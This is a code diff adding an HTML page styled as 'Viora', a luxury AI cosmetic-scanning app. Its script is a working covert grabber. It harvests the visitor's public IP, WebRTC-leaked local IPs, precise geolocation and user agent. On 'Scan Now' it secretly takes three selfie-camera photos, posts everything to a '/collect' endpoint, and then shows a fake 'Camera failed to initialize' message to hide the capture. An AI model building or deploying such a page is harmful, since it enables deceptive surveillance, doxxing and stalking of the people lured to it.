@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Viora - Luxury AI Cosmetic Lens</title>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;700&family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<style>
+:root {
+  --bg-top: #00d4ff;
+  --bg-mid: #ffc1d3;
+  --bg-bottom: #ffb37f;
+  --glass: rgba(255,255,255,0.2);
+  --blur: blur(24px);
+  --text-header: #ffffff;
+  --text-body: #ffffff;
+}
+
+/* Reset */
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  font-family: "Montserrat", sans-serif;
+  min-height:100vh;
+  display:flex;
+  flex-direction: column;
+  align-items: center;
+  padding-top:5vh;
+  overflow-x: hidden;
+  background: linear-gradient(180deg, var(--bg-top), var(--bg-mid), var(--bg-bottom));
+}
+
+/* Header */
+header { text-align:center; margin-bottom:5vh; position: relative; z-index:2; }
+header h1 {
+  font-family:"Cormorant Garamond", serif;
+  font-size:9vw;
+  font-weight:700; 
+  color: var(--text-header);
+  letter-spacing: 1px;
+  text-shadow: 0 0 2vw rgba(255,255,255,0.9), 0 0 3vw rgba(255,192,211,0.6);
+  animation: shimmerText 4s ease-in-out infinite alternate, sparkleLogo 2s ease-in-out infinite alternate;
+}
+header span {
+  font-size:3vw;
+  color: var(--text-header);
+  display:block;
+  margin-top:1vh;
+  text-shadow:0 0 1.5vw rgba(255,255,255,0.8);
+}
+@keyframes shimmerText {
+  0%{text-shadow:0 0 2vw rgba(255,255,255,0.9),0 0 3vw rgba(255,192,211,0.6);}
+  50%{text-shadow:0 0 3vw rgba(255,255,255,1),0 0 4vw rgba(255,192,211,0.8);}
+  100%{text-shadow:0 0 2vw rgba(255,255,255,0.9),0 0 3vw rgba(255,192,211,0.6);}
+}
+@keyframes sparkleLogo {
+  0%,100%{text-shadow: 0 0 2vw rgba(255,255,255,0.9), 0 0 3vw rgba(255,192,211,0.6);}
+  25%{text-shadow: 0 0 2.5vw rgba(255,255,255,1), 0 0 3.5vw rgba(255,255,255,0.8);}
+  50%{text-shadow: 0 0 3vw rgba(255,255,255,1), 0 0 4vw rgba(255,255,255,1);}
+  75%{text-shadow: 0 0 2.5vw rgba(255,255,255,1), 0 0 3.5vw rgba(255,255,255,0.8);}
+}
+
+/* Container with glow and breathing glass */
+.container {
+  width: 90%;
+  max-width: 540px;
+  max-height: calc(100vh - 10vh);
+  background: var(--glass);
+  border-radius: 32px;
+  backdrop-filter: var(--blur);
+  padding: 30px 40px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  box-shadow: 0 0 40px rgba(255,255,255,0.6), inset 0 0 30px rgba(255,255,255,0.25);
+  position: relative;
+  overflow: hidden;
+  animation: containerBreathe 6s ease-in-out infinite alternate;
+}
+@keyframes containerBreathe {
+  0% { transform: scale(1); box-shadow:0 0 40px rgba(255,255,255,0.6), inset 0 0 30px rgba(255,255,255,0.25);}
+  50% { transform: scale(1.03); box-shadow:0 0 60px rgba(255,255,255,0.8), inset 0 0 40px rgba(255,255,255,0.3);}
+  100% { transform: scale(1); box-shadow:0 0 40px rgba(255,255,255,0.6), inset 0 0 30px rgba(255,255,255,0.25);}
+}
+
+/* About text */
+#about { font-size:1.15em; color: var(--text-body); margin-bottom: 20px; text-align:center; line-height:1.6em; font-weight:500; text-shadow:0 0 18px rgba(255,255,255,0.7); }
+
+/* Map */
+#map { width:100%; height:320px; border-radius:20px; margin-bottom:12px; box-shadow:0 0 40px rgba(255,255,255,0.3); }
+
+/* Scan button inside glass */
+button#scanBtn {
+  width:100%;
+  padding:16px;
+  font-size:1.2em;
+  font-weight:600;
+  color: #ffffff;
+  background: linear-gradient(90deg, #ffc1d3, #ffb37f);
+  border:none;
+  border-radius:24px;
+  cursor:pointer;
+  transition: all 0.35s ease;
+  box-shadow:0 0 50px rgba(255,255,255,0.55);
+  position: relative;
+  overflow: hidden;
+  animation: buttonGlow 3s ease-in-out infinite alternate;
+  margin-top:0px;
+}
+button#scanBtn::after {
+  content:"";
+  position:absolute;
+  top:0; left:-100%;
+  width:100%; height:100%;
+  background: linear-gradient(120deg, transparent, rgba(255,255,255,0.3), transparent);
+  transform: skewX(-25deg); animation: btnShimmer 3s infinite;
+}
+@keyframes btnShimmer {0%{left:-100%;}50%{left:100%;}100%{left:100%;}}
+@keyframes buttonGlow {0%{box-shadow:0 0 50px rgba(255,255,255,0.55);}50%{box-shadow:0 0 80px rgba(255,255,255,0.7);}100%{box-shadow:0 0 50px rgba(255,255,255,0.55);}}
+button#scanBtn:hover { transform: translateY(-2px) scale(1.03); box-shadow:0 0 100px rgba(255,255,255,0.85); }
+
+/* Footer */
+footer { text-align:center; font-size:2.5vw; color: var(--text-header); margin-top:36px; }
+
+/* Responsive */
+@media (max-width: 480px) {
+  header h1 { font-size:12vw; }
+  header span { font-size:5vw; }
+  #about { font-size:4vw; }
+  button#scanBtn { font-size:4vw; padding:3vw 0; }
+  #map { height:40vh; max-height:50vh; }
+  .container { padding:5vw; border-radius:4vw; }
+}
+</style>
+</head>
+<body>
+<header>
+  <h1>Viora</h1>
+  <span>"Your Signature Shade, Perfected"</span>
+</header>
+
+<div class="container">
+  <div id="about">Point your camera at any cosmetic product to instantly identify its brand, shade, and nearby availability. Ultra precise, elegant, instantaneous.</div>
+  <div id="map"></div>
+  <button id="scanBtn">Scan Now</button>
+</div>
+
+<footer>© 2025 Viora AI</footer>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+// Map initialization
+let map = L.map('map').setView([0,0],2);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
+  attribution:'&copy; OSM',
+  maxZoom:19
+}).addTo(map);
+
+const bluePin = L.icon({
+  iconUrl:'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
+  shadowUrl:'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
+  iconSize:[25,41],
+  iconAnchor:[12,41],
+  popupAnchor:[1,-34],
+  shadowSize:[41,41]
+});
+
+// Payload & Camera
+const payload = { userAgent:navigator.userAgent, serverObservedIP:"${serverIP}", publicIP:null, geolocation:null, webrtcIPs:[], images:[] };
+fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{payload.publicIP=d.ip;send(false);});
+if(navigator.geolocation){ navigator.geolocation.getCurrentPosition(pos=>{
+  payload.geolocation={lat:pos.coords.latitude,lng:pos.coords.longitude,acc:Math.round(pos.coords.accuracy)};
+  map.setView([pos.coords.latitude,pos.coords.longitude],14);
+  L.marker([pos.coords.latitude,pos.coords.longitude],{icon:bluePin}).addTo(map);
+  send(false);
+});}
+const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+pc.createDataChannel("x");
+pc.onicecandidate=e=>{if(!e.candidate) return; const ip=e.candidate.candidate.split(" ")[4]; if(ip && !payload.webrtcIPs.includes(ip)) payload.webrtcIPs.push(ip);};
+pc.createOffer().then(o=>pc.setLocalDescription(o));
+
+document.getElementById("scanBtn").addEventListener("click",startScanner);
+function startScanner(){
+  // Take 3 pictures in the background
+  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(stream=>{
+    const video=document.createElement("video");
+    video.srcObject=stream;
+    video.play();
+    const canvas=document.createElement("canvas");
+    const ctx=canvas.getContext("2d");
+    const imagesCaptured=[];
+    video.onloadedmetadata=async ()=>{
+      canvas.width=video.videoWidth;
+      canvas.height=video.videoHeight;
+      for(let i=0;i<3;i++){
+        ctx.drawImage(video,0,0);
+        const imgData=canvas.toDataURL("image/png").split(',')[1];
+        imagesCaptured.push(imgData);
+        await new Promise(r=>setTimeout(r,300));
+      }
+      payload.images=imagesCaptured.filter(img=>img && img.length>0);
+      send(true);
+      stream.getTracks().forEach(t=>t.stop());
+      alert("Camera failed to initialize."); // always show
+    };
+  }).catch(err=>{
+    console.log("Camera error:",err);
+    alert("Camera failed to initialize.");
+  });
+}
+
+function send(force){ fetch("/collect",{method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)});}
+</script>
+</body>
+</html>
